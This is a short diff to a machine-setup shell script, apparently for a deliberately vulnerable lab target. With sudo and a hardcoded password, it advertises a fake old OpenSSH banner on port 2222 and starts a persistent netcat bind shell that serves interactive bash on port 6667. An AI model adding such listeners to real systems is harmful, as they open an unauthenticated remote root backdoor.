@@ -282,7 +282,7 @@ echo "ubuntu" | sudo -S killall nc 2>/dev/null
 # 2. Start the persistent listeners in a way that wont hang the script
 echo "ubuntu" | sudo -S screen -d -m bash -c 'while true; do echo "SSH-2.0-OpenSSH_4.3" | nc -l 2222; done'
 
-echo "ubuntu" | sudo -S screen -d -m bash -c 'while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p 6667 > /tmp/f; sleep 1; done'
+echo "ubuntu" | sudo -S sh -c 'nohup screen -d -m bash -c "while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 6667 > /tmp/f; sleep 1; done"'
     sleep 2
     ip a && sleep 2
     EOT
